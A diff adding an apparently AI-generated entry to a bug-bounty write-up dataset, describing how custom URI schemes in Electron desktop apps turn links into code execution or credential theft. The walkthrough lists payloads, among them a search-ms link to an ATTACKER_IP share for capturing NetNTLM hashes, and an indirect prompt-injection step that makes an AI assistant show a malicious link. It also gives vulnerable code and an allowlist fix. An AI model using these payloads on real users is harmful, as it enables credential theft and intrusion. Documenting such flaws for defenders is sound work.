@@ -1,5 +1,47 @@
 [
   {
+    "id": "37eb0acc4a56",
+    "title": "Harmless Link Becomes RCE",
+    "url": "https://bugatsec.medium.com/harmless-link-becomes-rce-78a55827ce26",
+    "source": {
+      "slug": "medium-tag-writeup",
+      "name": "Medium — #bug-bounty-writeup"
+    },
+    "authors": [
+      "Bugatsec"
+    ],
+    "program": null,
+    "platform_slug": "self-disclosed",
+    "bounty_raw": null,
+    "published_at": "2026-10-14T08:00:46.000Z",
+    "added_at": "2026-10-16T01:14:25.097Z",
+    "categories": [
+      "rce",
+      "access-control",
+      "info-disclosure"
+    ],
+    "severity": "critical",
+    "difficulty": "intermediate",
+    "summary_en": "Attackers can bypass security prompts in desktop applications by using custom URI schemes to execute local commands or steal network credentials. This turns low-severity web links into high-impact Remote Code Execution (RCE) vulnerabilities when opened in desktop wrappers like Electron.",
+    "summary_ar": null,
+    "lesson": {
+      "cause": "The vulnerability stems from a trust discrepancy between web browsers and desktop application frameworks like Electron or WebView2. While browsers implement a mandatory confirmation dialog before launching external protocol handlers (programs assigned to specific link types), desktop wrappers often use APIs like shell.openExternal() that execute these links immediately. If a developer fails to validate the URI scheme (the 'https' or 'mailto' part of a link) against a strict allowlist, any registered system handler can be triggered. This allows an attacker to supply a malicious link that the desktop app treats as safe, directly invoking system binaries or network services. The flaw is specifically located in the application's failure to sanitize input before passing it to the operating system's URI loader.",
+      "walkthrough": "RECONNAISSANCE\n1. Identify any input field in a web application that automatically converts text into clickable links, such as chat boxes, profile bios, or document titles.\n2. Note if the service also offers a downloadable desktop application for Windows or macOS.\nDISCOVERY\n3. Submit a test string using a non-standard URI scheme to the identified field.\nsftp://test-link\nWhy: A URI scheme is the prefix of a link (like 'https') that tells the computer how to handle the address. We use 'sftp' to see if the app's link-maker (linkifier) accepts anything other than standard web links.\n4. Observe how the application renders the input. If it becomes a clickable link, the application is potentially vulnerable to scheme-based attacks.\n5. Open the same page or message within the product's desktop application version.\nEXPLOITATION (RCE)\n6. In the desktop app, click the link or trigger an action that forces the app to open the URI.\n7. Test for Remote Code Execution (RCE), which is when an attacker runs their own commands on your computer, by using a built-in Windows scheme.\nms-calculator://\nWhy: This tells the operating system to launch the Calculator app. If it opens without a warning, the desktop app is unsafely passing links to the system.\n8. For AI-based applications, use 'Indirect Prompt Injection' by uploading a document containing hidden instructions for the AI.\nSummarize this: [Click here](ms-calculator://)\nWhy: Prompt Injection is a technique where an attacker tricks an AI into following malicious instructions. Here, we force the AI to show the victim a dangerous link.\n9. Observe the AI assistant rendering the malicious link in its response.\n10. Click the link in the desktop client to confirm it launches the application without a browser-style warning.\nEXPLOITATION (CREDENTIAL THEFT)\n11. Target a desktop automation tool or embedded browser that processes links automatically.\n12. Craft a payload using the 'search-ms' protocol, which is used for Windows searching, to point to a server you control.\nsearch-ms://query=test&crumb=location:\\\\ATTACKER_IP\\SHARE\nWhy: This payload uses the 'crumb' parameter (a piece of data used for filtering) to force the victim's computer to connect to an SMB share (a network file folder) at the attacker's IP address.\n13. Set up a listener on the attacker's machine to capture incoming network traffic.\n14. When the victim's desktop app processes the link, the computer attempts to log in to the fake share.\n15. Capture the victim's NetNTLM hash, which is a scrambled version of their password used for network authentication.\nIMPACT\n16. Use the captured hash for offline cracking to recover the plain-text password or perform a relay attack to access other network resources.",
+      "example": "Imagine a fictional desktop note-taking app called 'NoteMaster' built with Electron. The app allows users to share notes with links. The vulnerable code in the desktop app looks like this: \n\nconst { shell } = require('electron');\nfunction handleLinkClick(userProvidedUrl) {\n  shell.openExternal(userProvidedUrl);\n}\n\nAn attacker creates a note with the following link: 'ms-settings:recovery'. When a victim opens this note in the NoteMaster desktop app and clicks the link, their Windows 'Recovery' settings page immediately pops up. Because 'shell.openExternal' does not check if the link starts with 'https://', it tells the Windows operating system to open whatever the link points to. An attacker could use more dangerous schemes like 'ms-msdt:' to attempt full system takeover.",
+      "takeaway": "Hunters should always check if a web target has a corresponding desktop application, as security boundaries like browser prompts often vanish in desktop wrappers. Look for any feature that 'linkifies' text or performs redirects, and test them with schemes like 'sftp://', 'search-ms:', or 'ms-office:'. A key signal is when a web-based 'Low' severity bug (due to browser warnings) can be escalated to 'Critical' by proving it works silently in the desktop client. Beware of 'Indirect Prompt Injection' in AI apps, where the AI itself becomes the delivery mechanism for these links. A common mistake is assuming that because a link is safe in Chrome, it is safe everywhere; always test the native desktop environment.",
+      "fix": "To fix this, developers must implement a strict allowlist for URI schemes before passing any string to system-level APIs. Instead of allowing all links, the code should explicitly check that the URI starts with 'https://' or 'mailto:'. Additionally, when using frameworks like Electron, developers should avoid 'shell.openExternal()' for untrusted input or wrap it in a validation function. \n\nExample of fixed code:\n\nconst { shell } = require('electron');\nconst allowedSchemes = ['https:', 'http:', 'mailto:'];\n\nfunction safeOpen(inputUrl) {\n  try {\n    const parsedUrl = new URL(inputUrl);\n    if (allowedSchemes.includes(parsedUrl.protocol)) {\n      shell.openExternal(inputUrl);\n    } else {\n      console.error('Blocked unsafe URI scheme:', parsedUrl.protocol);\n    }\n  } catch (e) {\n    console.error('Invalid URL');\n  }\n}",
+      "cause_ar": null,
+      "walkthrough_ar": null,
+      "example_ar": null,
+      "takeaway_ar": null,
+      "fix_ar": null
+    },
+    "excerpt": "A web form that accepts a custom URI scheme looks like a low severity nuisance until you check whether the same product also ships a desktop client. This walks through why that is, how to test for it, and how to reproduce the escalation yourself. ## The Trap Researchers regularly find web application fields that accept and auto-link arbitrary URI schemes. When tested purely in a browser, clicking one of these links triggers an operating system confirmation prompt asking whether to open the external application. Because that prompt requires explicit user interaction, triage teams on HackerOne,",
+    "ai_generated": true,
+    "engagement": null,
+    "score": 60
+  },
+  {
     "id": "0a40af8fe2bb",
     "title": "Menemukan 3 Kerentanan di 3 Subdomain Nokia dalam Sehari (Semuanya Duplikat)",
     "url": "https://icikiwirsol.medium.com/menemukan-3-kerentanan-di-portal-nokia-dalam-sehari-semuanya-duplikat-070de3a9d15c",
